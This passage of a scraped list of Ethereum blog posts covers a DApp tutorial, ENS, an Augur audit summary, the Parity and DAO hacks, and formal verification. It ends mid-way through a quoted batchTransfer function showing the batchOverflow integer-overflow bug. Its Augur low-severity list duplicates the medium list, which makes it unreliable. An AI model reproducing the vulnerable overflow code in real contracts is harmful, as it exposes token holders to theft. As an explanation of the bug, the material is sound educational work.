"readtime": "6 min read", "upvotes": "240", "content": "From A to Z: Making the MVP of a real DApp on Ethereum and deploying itdev_zlBlockedUnblockFollowFollowingApr 5, 2018A month ago, I finished writing the Ethereum development walkthrough tutorial series, with the last part being a how-to make a DApp. While it concluded that tutorial series well enough and could serve as a solid starting point, I still thought it could be far more interesting to make a tutorial on how to make a full DApp, from start to finish, and share not only the code, but also the experience to get it running on the Ethereum\u2019s main network.You can find that DApp here, its github repos here and here. It\u2019s on all accounts a real DApp deployed on the Ethereum main net, and we\u2019ll try to dissect its development together.Kick offAs a project, making a decentralized application on Ethereum is not really different from making a classic, centralized one, beside the fact that more care should be put into planning and implementing the smart contracts that power the DApp.So the first thing we need to come up with, is, of course the idea.What will we\u00a0createOn this point, everyone has a different way of coming up with an idea for a project. For me, a project I always found funny, and it always remained in the back of my mind, is The Million Dollar Homepage, a website from 2005, where the owner, Alex Tew, sold every pixel in a 1000 x 1000 pixels canvas on his website for 1$.So my idea was, why not try to reproduce it on Ethereum? It should be fun and small enough to be doable for a tutorial. Our DApp could sell each pixel not for a whole Ether, it wouldn\u2019t be realistic, but let\u2019s say 1/1000th of one.Starting the development processFor a project as small as this one, writing down the milestones that needs to be achieved is enough to get started, anything more elaborated would require more documentation and throughout designing and modeling.The idea in this DApp is to sell pixels in 10 x 10 parcels, since individual pixels are too small to be seen easily. Tracking these parcels can be achieved by non-fungible tokens, commonly known as ERC-721 tokens, since each parcel is unique. We could obviously have a token keeping track of each individual pixel, but because of the performance limitations of the smart contracts, we have to make as much optimizations as possible.Each token owner in our DApp should have the possibility to modify the pixel colors, add a description or a link to their parcel, and could resell their parcel.Doing it the MVP\u00a0wayIn order to not waste development time making the perfect product, and check our assumptions early on, we will make just the most important functionality first, which is allowing users to acquire pixels parcels, and modify their colors and description.There are people who just set up a text-only landing page to see how many users it attracts, but let\u2019s not be that lazy and actually create a functioning prototype.The smart contract(s)Having your core features in mind (for some it\u2019s just generating a bunch of tokens and selling them) you should design your smart contract(s) in a way that you could enhance or upgrade them in a practical way. There isn\u2019t an industry standard or a best way to achieve that but a bit of research will return a few potential solutions implemented by other projects. You could pick up one and adapt it to your needs, or come up with a solution more suitable to your project.In this project, I preferred to implement all the functionalities directly in the smart contract. Since I already had the base code for an ERC-721 token from another project, I just made some necessary modifications to it, and added the ability for the owner to modify the data of the token, and the possibility to sell their token.I don\u2019t think there will be any needs later that would require updating the smart contract, and if someone, for example, wants to add a functionality like renting their parcel, they could use another smart contract to achieve that.Also, I didn\u2019t put any pause functionality into the smart contract, or a mechanism to change the smart contract if something goes wrong, because my second goal for this project, is to show off what differentiate developing on the blockchain from a classic centralized application for anyone who\u2019s new to the blockchain and discovers it through this project.It\u2019s the wise choice to have a safety plan if shit hits the fans, but I wanted to take that risk with this project by stripping myself from any power over the deployed smart contract.Writing a good test suite is also important, since you can\u2019t risk to follow the write-code-then-wait-for-bugs-during-production methodology with smart contracts. You need to make sure as much as possible that your code does only what it should and nothing more.Web frontWhile I wrote the smart contract completely since it was short enough that I didn\u2019t want to waste more time finding the best way to upgrade it, on the web front-end, it\u2019s definitely possible to go down the MVP road.The functionalities I implemented are: showing the pixels grid, allowing users to acquire the parcels, and allowing them to modify the data for it. One could say that the last functionality crosses the first iteration of making an MVP, but again, let\u2019s not be lazy asses.Of course the other functionalities exists on the smart contract, and could be added anytime to the front-end, but we want to confirm our assumptions first, and make sure that there are people who want to use our product.Deploying the\u00a0DAppNow, that our MVP is developed and ready, we need to deploy it.The smart\u00a0contractTo deploy the smart contract, we need ether for gas, to acquire ether, you could buy it on a platform like Coinbase or Cex.io, but it will probably take days or weeks depending on the platform for your order to go through.Cryptocurrencies transaction, circa\u00a02018Another solution is to buy ether from a seller nearby, by finding them on a platform like LocalEthereum or some Facebook group. Yeah, it really looks like buying drugs, and it definitely doesn\u2019t help cryptocurrencies shady image.After you got your ether, the easiest solution to deploy a smart contract is to use Remix and MetaMask, but I preferred to use a light geth node and truffle.The front-endFor the front-end, I used Github websites, it\u2019s free and makes the code source available openly, which is what we want.MarketingWell, as I said on top, a DApp is just like any other software, the same rules apply to it, it\u2019s great to create something, but if no one knows about it or try it, it\u2019s useless.Now, this is a point I can\u2019t help you on, because I\u2019m totally oblivious to taking the word out for a project, I could not sell sunscreen to a sunburned guy. So you would need to rely on some PR magician to attract users to try your DApp.The codeThe source code is available on Github.The smart contracts are here:1000ethhomepage/1000ethhomepage-contracts1000ethhomepage-contracts - The smart contracts of the 1000ethhomepage, an MVP of a DApp on Ethereum.github.comWhile the repo for the web front is here:1000ethhomepage/1000ethhomepage.github.io1000ethhomepage.github.io - The web page of the 1000ethhomepage, an MVP of a DApp on Ethereum.github.comLooking forwardObviously, even the functionalities I implemented on the front end are incomplete and need more polishing, but since we are going the MVP way, it\u2019s not necessary to enhance them now. I can also see some performance problems that could arise if a lot of parcels are acquired, but it\u2019s not the case now, so there is no need for early optimizations, until we see how the DApp performs during production.Apart from this being a tutorial, I really want to have this website as a real, working, demo project for people who are just discovering the blockchain, and Ethereum\u2019s possibilities, if the DApp gets any attention, one of my goals is really to put an accent on introducing decentralization to newcomers, and of course, keeping this project as an ongoing tutorial and field report of how the DApp is surviving on the blockchain.So, don\u2019t hesitate to take a look at the deployed version of the DApp, maybe acquire some parcel and link it to your super, ground-breaking DApp, or advertise your scammy ICO, or just to leave your mark on it, it will be helpful to have anything of value to write in a follow-up tutorial.And of course you can find me on twitter @dev_zl.", "responses": "3"}, {"title": "Ambrosus Alpha: Gateway API and Developer Portal\u00a0Launched", "author_name": "Team Ambrosus", "link": "https://blog.ambrosus.com/ambrosus-alpha-gateway-api-and-developer-portal-launched-689dec5d9fab?source=search_post", "post_date": "Feb 26, 2018", "readtime": "2 min read", "upvotes": "840", "content": "Ambrosus Alpha: Gateway API and Developer Portal\u00a0LaunchedTeam AmbrosusBlockedUnblockFollowFollowingFeb 26, 2018We are excited to announce that following the private testing of tools and gateways of AMB-NET, we are enabling them for the community use in order to start experimenting with and building on top of AMB-NET. Additional elements will be launched throughout Spring 2018 through the two key assets as part of the Public Alpha Release aimed at the technology-savvy members of Ambrosus Community: Developer Portal and Gateway API.", "responses": ""}, {"title": "Smart Contract Attacks [Part 1] - 3 Attacks We Should All Learn From The\u00a0DAO", "author_name": "Pete Humiston", "link": "https://hackernoon.com/smart-contract-attacks-part-1-3-attacks-we-should-all-learn-from-the-dao-909ae4483f0a?source=search_post", "post_date": "Jul 5, 2018", "readtime": "10 min read", "upvotes": "198", "content": "Smart Contract Attacks [Part 1] - 3 Attacks We Should All Learn From The\u00a0DAOPete HumistonBlockedUnblockFollowFollowingJul 5, 2018If you\u2019ve been following the crypto long enough you\u2019ve probably heard of one or two smart contract attacks, attacks which have resulted in the theft of cryptoassets worth tens of millions of dollars. The most notable attack remains the Decentralized Autonomous Organization (DAO), one of crypto\u2019s most highly anticipated projects of all time and a poster-child of the revolutionary capabilities of smart contracts. While most have heard of these attacks, few truly understand what went wrong, how it went wrong, and how to avoid making the same mistake twice.Smart contracts are dynamic, complex, and incredibly powerful. While their potential is unimaginable, its unlikely they\u2019ll become attack-proof overnight. That said, it\u2019s imperative for the future of crypto that we all learn from prior mistakes and grow together. Although the DAO is a thing of the past, it remains a great example of susceptible smart contract attacks that developers, investors, and community members should familiarize themselves with.In Part 1 of my Smart Contract Attacks series, I\u2019ll be walking you through in great detail (Solidity code included) 3 common attacks we can learn from the DAO. Whether you\u2019re a developer, investor, or fan of crypto, being knowledgeable on these attacks will equip you with a deeper understanding and appreciation for this promising tech.", "responses": "2"}, {"title": "A developer\u2019s guide to ENS\u00a0concepts", "author_name": "Nick Johnson", "link": "https://medium.com/the-ethereum-name-service/a-developers-guide-to-ens-concepts-7004eea8a073?source=search_post", "post_date": "May 10, 2017", "readtime": "3 min read", "upvotes": "155", "content": "A developer\u2019s guide to ENS\u00a0conceptsNick JohnsonBlockedUnblockFollowFollowingMay 10, 2017If you\u2019re looking at using the Ethereum Name Service inside your application or contract, or wanting to build something on top of ENS like a registrar or resolver, this post will give you the background you need to get started.ENS\u2019s three componentsENS is constructed from three primary components: the registry, registrars, and resolvers.The registry is the central directory of ENS; it keeps a list of every ENS domain (and subdomain, and sub-sub-domain, and so forth).Every name in ENS can be found by looking it up in the ENS registry, and it\u2019s the only component you need the address for.The registry maintains three pieces of information about every name it knows about:The account that owns the name (owner).The address of an (optional) resolver contract.A time-to-live for caching.Names can be owned by external accounts or by contracts. When a contract owns a name, we call that contract a registrar.Registrars are the second component of ENS, and are responsible for allocating new names to users. The best known of these is the\u00a0.eth registrar, but anyone who owns a domain can assign ownership to a contract and create a registrar of their own. Registrars don\u2019t have any special permissions\u200a\u2014\u200athey just use their ability to tell the registry to create subdomains.Resolvers are contracts that can tell you the resource associated with a name\u200a\u2014\u200asuch as an Ethereum address, a swarm hash, or a public key. Anyone can implement a resolver, as long as it implements a certain agreed-upon interface, and point their domain at it. For convenience, there are \u2018public\u2019 resolvers that anyone can point their domain at and use.Looking up names in\u00a0ENSLooking up an ENS name is a two-step process. First, call the ENS registry\u2019s resolver method, to fetch the address of the resolver responsible for the name. Then, ask that resolver for the resource you\u2019re interested in.For instance, to look up the Ethereum address of \u2018vitalik.eth\u2019, we\u2019d first call resolver(namehash('vitalik.eth')) on the registry, then we\u2019d call addr(namehash('vitalik.eth')) on the resolver whose address was returned by the first call. If we wanted the swarm hash for \u2018vitalik.eth\u2019 instead, the first step would remain the same, but in the second step we\u2019d call content(namehash('vitalik.eth')) on the resolver.namehashENS does not operate directly on names\u200a\u2014\u200athere are a number of reasons for this, one of which is that parsing and processing text on the blockchain is very inefficient. Instead, ENS operates on secure hashes.A single component of a name\u200a\u2014\u200aeg, vitalik or eth can be simply hashed using keccak256 (commonly referred to as sha3 in Ethereum). We call the result a \u2018label hash\u2019 or just \u2018label\u2019.Because ENS is a hierarchal system, however, we need some way to represent hierarchal names. We cannot simply hash the whole name\u200a\u2014\u200aeg, sha3('vitalik.eth') because there would be no way to answer questions like \u201cis vitalik.eth a subdomain of eth?\" or \u201cwhat is the hash of the \u2018wallet\u2019 subdomain of this domain?\u201dTo solve this, ENS hashes names using a system called namehash. Here\u2019s the full definition of namehash:namehash('') -> '0x0000000000000000000000000000000000000000000000000000000000000000'namehash('a.xyz') -> sha3(namehash('xyz'), sha3('a'))Namehash is thus a recursive function: to calculate the final hash, you start with the rightmost component, and repeatedly calculate the label hash, then combine it with the previous component\u2019s name hash.Usually, you won\u2019t need to concern yourself with the internal details of namehash\u200a\u2014\u200aENS libraries will handle it for you, and you can look at it as a black box that turns names into hashes.ResourcesThe ENS repository contains source code for all the primary components of ENS.The ENS documentation goes into a lot more detail about concepts and API functionality, with practical details and examples.EIP 137 defines ENS in full, and provides references to the different resolver profiles currently defined.", "responses": "1"}, {"title": "Augur Core\u00a0Audit", "author_name": "Zeppelin", "link": "https://blog.zeppelin.solutions/augur-core-audit-244160d77c09?source=search_post", "post_date": "Mar 12, 2018", "readtime": "4 min read", "upvotes": "310", "content": "Augur Core\u00a0AuditZeppelinBlockedUnblockFollowFollowingMar 12, 2018The Augur team asked us to review and audit their Augur Core project. We looked at the code and now publish our results.The audited project can be found in the AugurProject/augur-core GitHub repository. The version used for this report is commit 45e1afb7eb1a895d923c97fe01e068c772c583ef.Update: the Augur team implemented some of our recommendations and added new features, after which we performed a second audit round. The commit for the final audit is 3b5a63d372d205a0214e3061293d5bca0fd5636a.Update 2: the Augur team implemented our additional recommendations after the second audit. The final commit containing all the fixes is 7f3c79a5dd471a98df8f66a640902e063f15f796.The full report can be found here, and a list summary of the issues ordered by severity can be found next.Critical SeverityUse safe math (new)An attacker can manipulate the tentative winning outcome in case a forkAn attacker can prevent forking-market traders from claiming their feesMarkets can be migrated after finalizationMarkets are not sanity-checked in trading moduleUniverse open interest can be manipulated by an attackerComplete sets of shares can be purchased for freeAlternative denomination tokens can be stolen from a Reporting WindowOrder info is repeated as arguments when cancelling an orderIt may not be possible to stake tokens on an invalid outcomeMarkets ether balance can be stolen by the first reporterAll reporting fees can be frozen by a Market creatorA market owner can block the Participation token purchaseHigh SeverityExtractable functionality is not necessary and error proneNon-potential-winning dispute crowdsourcers can redeem their REP tokensMarket number of ticks can be zeroSelf-reference in market nudging mechanismTight coupling between contractsAnyone can trigger Augur eventsCancelling an order with share tokens in escrow will failMarkets can be created with malicious Cash tokensShareholders fees can be frozen by a malicious market creatorSpender contracts cannot be re-approved if updatedMedium SeverityFavor pull payments over push payments (new)Integer index types are unnecessarily smallUnbound iteration in arrays (new)Unbound iteration in arraysUsers are allowed to place orders for a market independently of their stateUnclear relation between MIN_ORDER_VALUE and MINIMUM_GAS_NEEDEDReentrancy risk in FillOrderMarkets can be initially reported in a locked universeForking market can be migratedFork values for child universes must be manually updatedTrading contracts upgradeability may become uselessController does not guarantee that dev mode cannot be turned on againWhitelisted contracts are not explicit to the userFavor pull payments over push paymentsIt is possible to create orders for untrusted marketsMarkets can be created in a locked universeEventually it will not be possible to produce further forksSpender contracts cannot be re-approved if updatedNaming issuesRepeated code for factory contractsUnused boolean return valuesUnsolved TODO commentsInstances of Map contract left in blockchain storageUnused Set libraryInconsistent usage of getter functions and state variablesUse a standard toolchain for building contractsNo assertions for detecting broken invariantsInstall OpenZeppelin via NPMOpenZeppelin standard tokens were modifiedOutdated OpenZeppelin\u2019s contractsOutdated documentationOrders are vulnerable to front-runningBasic token implementation allows transfers to the zero addressLack of Report abstractionUniverse open interest is not decremented in bad timesMarkets can fork into more than N+1 universes, N being the number of outcomes (new)Markets may fork in more than N+1 universes, N being the number of outcomesWhen a market forks, stake tokens and disputes of other markets are resetUnchecked token transfers and approvalsShareToken is unnecessarily whitelistedUse safe mathRemove unused codeThe Trade logic treats a lack of gas as a complete order fillMarket creators may not be able to collect their corresponding feesDelegator memory allocation not working for arguments larger than 32 bytesDelegator not working for return data greater than 32 bytesLow SeverityNaming issuesRepeated code for factory contractsUnused boolean return valuesUnsolved TODO commentsInstances of Map contract left in blockchain storageUnused Set libraryInconsistent usage of getter functions and state variablesUse a standard toolchain for building contractsNo assertions for detecting broken invariantsInstall OpenZeppelin via NPMOpenZeppelin standard tokens were modifiedOutdated OpenZeppelin\u2019s contractsOutdated documentationOrders are vulnerable to front-runningBasic token implementation allows transfers to the zero addressLack of Report abstractionUniverse open interest is not decremented in bad timesMarkets can fork into more than N+1 universes, N being the number of outcomes (new)Markets may fork in more than N+1 universes, N being the number of outcomesWhen a market forks, stake tokens and disputes of other markets are resetUnchecked token transfers and approvalsShareToken is unnecessarily whitelistedUse safe mathRemove unused codeThe Trade logic treats a lack of gas as a complete order fillMarket creators may not be able to collect their corresponding feesDelegator memory allocation not working for arguments larger than 32 bytesDelegator not working for return data greater than 32 bytesConclusionThirteen critical and ten high severity issues were found, along with recommendations on how to fix them. Additionally, some medium and lower severity issues were found and explained. Some changes were proposed to follow best practices and reduce the potential attack surface.", "responses": "1"}, {"title": "$150 Million Locked On the Ethereum Network\u200a\u2014\u200aHow to Protect\u00a0Yourself", "author_name": "Mason", "link": "https://medium.com/tokenstandards/150-million-locked-on-the-ethereum-network-how-to-protect-yourself-d687d17ed810?source=search_post", "post_date": "Nov 7, 2017", "readtime": "3 min read", "upvotes": "386", "content": "$150 Million Locked On the Ethereum Network\u200a\u2014\u200aHow to Protect\u00a0YourselfComplexity Is the Enemy of\u00a0SecurityMasonBlockedUnblockFollowFollowingNov 7, 2017Parity is an Ethereum implementation written in Rust, spearheaded by the very talented cofounder of Ethereum, Gavin Wood. The implementation provides an easy to use GUI for creating multi-sig wallets. The multi-sig contract that underpins this functionality was found to have a vulnerability on July 19, 2017 that resulted in a loss of $30 million. On November 7, 2017 a second vulnerability was found in the wallet contract that resulted in a lockup of $150 million in Ether. While Ethereum does not offer a simple solution for high security wallets, there are a few steps you can take to prevent falling victim to such an attack.The bug report filed by the \u201cattacker\u201dIn a traditional production software environment, we\u2019re able to deploy code to a public interface such as a website. If the code does not appear to carry the functionality we hope it does, what happens? Perhaps no one notices, perhaps a few people complain, at the end of the day we can update the code and the minor nuisance is resolved. In the world of Ethereum, once we deploy a piece of code it is there forever, for everyone to see and play with. In an ideal world, only you have access to this code, in the world of blockchain everyone has access to it. This means that if a piece of code is deployed to the Ethereum network, its in most cases not possible to update it.A Conversation With the \u201cattacker\u201dIf we put $1 million in Ether into a smart contract and the smart contract is found to contain a vulnerability, a few things may occur. It may go unnoticed, it may go noticed by a hacker who decides to exploit it, or it will be uncovered by the contract owner and they will be able to recover the funds. In this case it was exploited by an individual claiming to be \u201cresearching\u201d the previous Parity hack.The \u201cattacker\u201dSo how can we protect ourselves?KISS Principle\u200a\u2014\u200aKeep it simple stupidMost smart contracts introduce vulnerabilities by attempting to account for corner cases and optimizations. The first Parity vulnerability was due to an attempt to optimize the amount of gas used during execution. The current Parity vulnerability was due to the inclusion of new, untested library functionality. A manageable smart contract will contain the minimum amount of functionality necessary to complete the task. Introducing code to optimize a premature solution increases the complexity of the contract, thereby reducing the security.Unit TestsIn common software development as well as smart contract development it can be convenient to overlook adequate unit tests. When code is non-revocable once it reaches production, a higher level of diligence is required. As a rule of thumb, your smart contract should contain adequate unit tests to verify the functionality of your smart contract as well as the corner cases.Smart Contract AuditsAny smart contract that is sent to production should undergo a security audit. A good smart contract security auditor will have experience building real-world smart contracts, a wealth of projects on GitHub, and will share a check list of the common vulnerabilities that they look for. Ensure the auditor can engage in conversation about the various attack vectors associated with your smart contract. This may not seem like a formal approach, however the industry is still very young and this is how it operates at the moment.Following these guidelines can help reduce the risk and anxiety associated with sending smart contracts to the Ethereum Mainnet.Test, Audit, Deploy.", "responses": ""}, {"title": "Formal Verification for n00bs\u200a\u2014\u200aPart 1: The K ecosystem", "author_name": "Marek Kirejczyk", "link": "https://medium.com/ethworks/formal-verification-for-n00bs-part-1-b4781db2a383?source=search_post", "post_date": "Jan 25", "readtime": "4 min read", "upvotes": "551", "content": "Formal Verification for n00bs\u200a\u2014\u200aPart 1: The K ecosystemMarek KirejczykBlockedUnblockFollowFollowingJan 25This is first in a series of blog posts on Formal Verification:Part 1: The K ecosystemPart 2: Proving the correctness of a tokenPart 3: Formal Verification for n00bs -Part 3: An attempt to prevent classic hack with ActPart 4: Understanding K languageThe motivation for Formal VerificationSecurity of smart contracts is still a crucial challenge: we all remember the DAO, parity hacks, a bunch of smaller attacks and the most recent delayed hard fork. We would like to see the future in which we can be way more confident about our code.Depending how you count, event over a half a billion dollars (by today\u2019s Ethereum evaluation), was lost in a couple of biggest smart contract hacks.What about if behind every responsible piece of code stands pure solid mathematics instead of personal conviction of developers? With formal verification tools for Ethereum finally maturing, it is now not only possible but also practical.In this and following post we will be getting step by step into the world of K-framework, which allows to formally verify EVM smart contracts.The heart: Semantics and the K\u00a0languageThe heart of the whole ecosystem is language K. K is a language specially designed for defining semantics. Semantics describes the behavior of computer programs. For example, when we say that a construction x++ for x that is uint means that a program in Solidity executing it will always increase the value of x by 1, except for one value x = 2^256\u20131:Example of \u201clow-level\u201d semantics in plain words:x++ set value of x to 0, if x = 2^256\u20131;x++ sets value of x to x+1; otherwise.This type of semantics, describing the meaning of every single instruction, is a kind of low-level definition. Besides that, what K also allows is to create high-level semantics, feasible to formulate semantics like the one below.Example of \u201chigh-level\u201d semantics in plain words:Function bool isPrime(int x) returns true only if x is a prime.To formally prove that your smart contract behaves as you wish, you need to provide:low-level semantics of the language you use.code of your program (EVM bytecode)provide high-level (intended) semantics of your programProviding high-level semantics is the most interesting and at the same time most challenging: you have to formulate how you actually wish that your program behaves.MagicThen the magic starts. The verifier is proving (or finding a counter-example) that your program together with low-level semantics of the programming language that you use, is indeed doing exactly the same stuff as behavior described by provided high-level semantics.The K ecosystemThe K-framework ecosystem is somewhat complex but contains all you need:K language that allows you to write any kind of semantics;Tooling that allows proving semantics using Z3 - a tool for automatic proving created by Microsoft Research;Semantics for Ethereum Virtual Machine - KEVM, written by Everett Hildenbrandt;Two (EDIT) c\u0336o\u0336m\u0336p\u0336e\u0336t\u0336i\u0336n\u0336g\u0336 DSLs to create high-level semantics: act (part of KLAB created by dapphub) and eDSL (created by runtimeverification).The ecosystem for creating proofs on\u00a0EVMSo the only additional work to do after the developing process is to write high-level intended semantics and put all the machinery to work.The high-level semantics you can do it directly in K or use one of the mentioned DSLs tailored, particularly for Solidity.Let\u2019s take a look at the\u00a0exampleThe natural questions are born here: how complicated high-level semantics is possible to formulate in K? Below is an example of high-level semantics of a ERC20 transfer function, written in Dapphub/klab specification language:What does it all mean? We will answer this question in the very next blog post in the series. Spring is coming for formal verification!Special thanks to Tomasz Kazana who\u2019s work on formal verification in Ethworks lead to writing this blog post.Stay tunedTo get updates on formal verification and other Ethereum related topic follow us on twitter: @ethworksYou can also follow us on Medium if you like the story \ud83d\udc4f \ud83d\udc4f \ud83d\udc4f.", "responses": "3"}, {"title": "The Smart Contract Network\u00a0Fallacy", "author_name": "BlockChannel", "link": "https://medium.com/blockchannel/the-smart-contract-network-fallacy-7b4d27f4d149?source=search_post", "post_date": "Aug 29, 2017", "readtime": "6 min read", "upvotes": "199", "content": "The Smart Contract Network\u00a0FallacyBlockChannelBlockedUnblockFollowFollowingAug 29, 2017Note: This post assumes foundational understanding of crypto. This post was originally featured on BraveNewCoin and was written by Kyle Samani of Multicoin Capital.Ethereum is unquestionably the market leading smart contract platform. It\u2019s the oldest and most mature. It likely has the best protocol developers and certainly has the best community. Developer interest is surging. Major companies are investing in the platform. It has a clear roadmap. It\u2019s led by one of the brightest minds of our era.Ethereum\u2019s network value is about $30B. Here\u2019s the competition:NEO\u200a\u2014\u200a$2BEthereum Classic\u200a\u2014\u200a$1.5BQTUM\u200a\u2014\u200a$.9BStratis\u200a\u2014\u200a$.6BWAVES\u200a\u2014\u200a$.5BEOS\u200a\u2014\u200a$.5BLisk\u200a\u2014\u200a$.25BAt current prices, the combined network value of all of Ethereum\u2019s competitors is about 10\u201315% of Ethereum\u2019s network value.Market prices imply that Ethereum has a strong network effect. Ethereum presents itself as the \u201cworld computer,\u201d which naturally begs for OS-like analogies: the more developers use Ethereum, the more users will want Ether, which encourages more developers, etc.This analogy doesn\u2019t capture the nuance of the dynamics at play. Smart contract platforms like Ethereum should not be compared to operating systems, but rather to programming languages.Specifically, the OS analogy misrepresents the network effects for the supply side (why should developers choose Ethereum) and demand side (why should users buy Ether). Concerns about network security are valid, but can be largely mitigated through cross-chain anchoring.I\u2019ll walk through each of these fallacies below.DEMAND SIDE\u200a\u2014\u200aUSERS WON\u2019T\u00a0CAREOperating systems create network effects because users make a mutually exclusive decision to use one OS at the expense of not choosing another OS. You cannot run Windows and Linux on your desktop (ignoring virtual machines since only a small minority of users have a need or technical ability to leverage virtual machines effectively).Since users are locked into an OS, developers naturally develop for the OS. This creates more and better apps for the OS, which draws in more users. The virtuous cycle flourishes.Users won\u2019t have to know or care about which blockchain they\u2019re interacting with. To most users, blockchains will be abstracted to \u201cplease enter your password to verify your transaction.\u201dAs a user interacting with distributed applications (Dapps), you will never \u201csee\u201d a blockchain. All you will see is a web3 front end that triggers an on-chain transaction using a tool such as Parity or Metamask (for the rest of this post, I\u2019ll refer to these types of tools as web3 clients even though web3 is technically Ethereum-specific). Although web3 clients don\u2019t yet exist for non-Ethereum chains, they\u2019re being built and will be available soon, and they\u2019ll support multiple chains. In time, browsers will natively implement multi-chain web3 clients.Web3 clients themselves can abstract this problem even further. As web3 clients implement support for many chains, they\u2019ll also integrate decentralized exchanges such as Shapeshift and 0x. As a user, if you try to interact with a Dapp that requires Stratis tokens, but you only have Ether, your web3 client will seamlessly sell your Ether for Stratis on an exchange in real time. Then the web3 client will send those Stratis tokens to the Dapp. As a user, you won\u2019t know or care about the underlying token at all.Your web3 client will generate a mnemonic seed that\u2019s used to derive private keys, public keys, and addresses for all supported chains. As a user, you\u2019ll only have to memorize/store one \u201cpassword\u201d and everything else will be seamless.To sum up all of the above, as a user, you won\u2019t have to care what chain or token you\u2019re using. All Dapps will, regardless of underlying technology platform, just work. All chain and token complexity will be abstracted away.SUPPLY SIDE\u200a\u2014\u200aINTEROPERABLE TOKENS COMMODITIZE CHAINSWith any two smart contract platforms, tokens can roam across chains. ETH tokens will not be bound to the Ethereum chain. Stratis tokens will be available on the NEO chain, and Tezos tokens will be available on the WAVES chain.How? Synthetic tokens.Imagine a two known smart contracts, one on the ETH chain, one on the ETC chain. If I want to move X ETH tokens to the ETC chain, I send some ETH to that contract on the ETH chain and specify my ETC address. When the ETH contract receives my ETH, it triggers the ETC contract to release X tokens to my ETC address. Those synthetic tokens can also be called ETH. This system works in both directions.(I recognize this diagram doesn\u2019t correctly portray how smart contracts issue tokens on a technical basis, but it\u2019s still useful to illustrate how assets move across chains)This function will level the playing field between chains. When any coin will run on any chain, why care about the chain or the token at all? A lot of complexity gets abstracted away.Note there is one obvious downside to this mechanism: gas costs on each chain must be paid in the chain\u2019s native currency. However, gas costs shouldn\u2019t be significant on a % basis. If more than\u00a0.1-.2% of transaction volume is being paid in gas, the chain itself will probably fail. In light of the framework I proposed above, the \u201chow does a user pay for gas?\u201d question is legitimate, but not substantial in impact relative to the gains of token-chain abstraction.MITIGATING NETWORK SECURITY RISKS THROUGH CROSS CHAIN ANCHORINGAs a token loses network value, risk of 51%-style attacks increases. This is obviously true for proof-of-stake consensus systems. It\u2019s also true for proof-of-work consensus systems as miners choose which coins to mine based on cost to mine vs value of the coin.But even network security risk can be mitigated through cross chain anchoring. Ethereum is adopting this mechanism in Plasma by committing merkle roots from child chains to parent chains. This is live in Factom today: Factom anchors a merkle root of its own chain to every Bitcoin block.In time, we\u2019ll start to see most chains anchor themselves to other chains as a form of risk mitigation. Attacking a network will require attacking all anchored networks. This is exponentially more difficult than attacking a single chain.SMART CONTRACT PLATFORMS ARE LIKE PROGRAMMING LANGUAGESIf users won\u2019t care about underlying chains, if the tokens are instantly and seamlessly tradeable, if tokens themselves roam across chains, and if network security can be maintained, what avenues of differentiation are left between chains? Basically, dev tools and governance mechanisms.Stratis has a singular focus: make it as easy as possible for C# devs to build using blockchains. There are millions of C# developers today, most of whom probably don\u2019t want to learn Solidity (native Ethereum language) or Ocaml for Tezos. You could argue that C# developers are being irrational and should learn languages that are designed specifically for blockchains. For example, it\u2019s unlikely that Stratis will be able to implement formal verification since C# wasn\u2019t designed with formal verification in mind.On the other hand, Javascript was developed as a front end language, but is now one of the most popular back end languages courtesy of Node.js. Some developers hate loosely typed languages like Javascript. Others hate statically-typed language likes C.Even though all of the major programming languages today provide Turing-completeness, the market has empirically demonstrated a need for many programming languages with unique tradeoffs (readability, compiled vs interpreted, abstractions, memory management, native performance, parallelizability, etc).A single blockchain shouldn\u2019t dictate the rules and mechanics of all smart contract development. Given the lack of strong network effects, many smart contract platforms will thrive.Now let\u2019s turn to governance. Dash has had on-chain governance for a few years. By all accounts, it seems to work rather well. Tezos has presented a variation of Dash\u2019s on-chain governance. The Dash community is thriving, innovating, and growing. On-chain governance may be what blockchains have always needed but never had.There aren\u2019t any historical counterfactuals to prove this case. Bitcoin has obviously faced serious governance challenges in the last couple of years, but many open source projects have thrived in the absence of on-chain governance. The Linux kernel, the many Linux desktops, Firefox, Wikipedia, Chrome (and all of its forks), the Android Open Source Project (and all of its forks), WebRTC, Ethereum itself, and many other open source projects have succeeded without a formal stakeholder engagement model.SUMMARYCurrent market prices imply that Ethereum is going to be the runaway market leader for smart contract platforms. This is not a given. There are many secular trends at the demand level, supply level, and security level that commoditize most of Ethereum\u2019s perceived advantages. Ethereum will not be the sole smart contract platform. That\u2019s not to say Ethereum isn\u2019t here to stay or that Ethereum won\u2019t thrive. I wouldn\u2019t bet against Ethereum. But there will be huge opportunities for non-Ethereum smart contract platforms. Ethereum will not be the one smart contract platform to rule them all.", "responses": ""}, {"title": "Ethos Unaffected by batchOverflow ERC20\u00a0Bug", "author_name": "Shingo Lavine", "link": "https://medium.com/ethos-io/ethos-unaffected-by-batchoverflow-erc20-bug-7f80ef29f2d2?source=search_post", "post_date": "Apr 25, 2018", "readtime": "5 min read", "upvotes": "506", "content": "Ethos Unaffected by batchOverflow ERC20\u00a0BugShingo LavineBlockedUnblockFollowFollowingApr 25, 2018Hey Ethos community! Doing a special post here today in light of recent news of a vulnerability in some ERC20 contracts. Specifically, this bug is the batchOverflow bug outlined in this piece: https://medium.com/coinmonks/alert-new-batchoverflow-bug-in-multiple-erc20-smart-contracts-cve-2018-10299-511067db6536All credit goes to them for finding this bug. I\u2019ll be trying to simplify it to make it understandable and address any concerns you all may have around this bug.Contract/Transaction in\u00a0QuestionContract with the vulnerability: https://etherscan.io/address/0xc5d105e63711398af9bbff092d4b6769c82f793d#codeTransaction exploiting vulnerability: https://etherscan.io/tx/0xad89ff16fd1ebe3a0a7cf4ed282302c06626c1af33221ebe0d3a470aba4a660fBreaking it Down\u200a\u2014\u200aInteger\u00a0OverflowSo what\u2019s going on here? How did they send so many tokens? It essentially boils down to the age-old \u201cinteger overflow\u201d attack. An integer overflow occurs when you try to enter a value that is too big for the range that can be stored.For example, if you have an 8-bit integer, the largest number you can represent is 255 or 0b11111111 in binary. If you add 1 to 0b11111111, instead of getting 256 (0b100000000), which requires at least one more bit to store, you will get 0 as all the bits will flip to 0. If you notice, 256 has a 1 then 8 0s, but in an integer overflow, only the 0s are stored. For more information on integer overflows, read here: https://en.wikipedia.org/wiki/Integer_overflowHow Did That Cause a Vulnerability?Let\u2019s take a look at the code\u2026function batchTransfer(address[] _receivers, uint256 _value) public      whenNotPaused returns (bool) {     uint cnt = _receivers.length;     uint256 amount = uint256(cnt) * _value;     require(cnt > 0 && cnt <= 20);     require(_value > 0 && balances[msg.sender] >= amount);     balances[msg.sender] = balances[msg.sender].sub(amount);     for 